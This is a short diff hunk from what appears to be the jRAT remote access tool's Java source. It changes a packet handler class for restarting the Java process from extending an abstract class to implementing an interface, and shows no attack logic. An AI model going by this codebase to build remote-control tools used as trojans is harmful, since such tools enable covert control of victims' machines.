@@ -6,7 +6,7 @@ import jrat.common.downloadable.JavaArchive;
 
 import java.io.File;
 
-public class Packet37RestartJavaProcess extends AbstractIncomingPacket {
+public class Packet37RestartJavaProcess implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
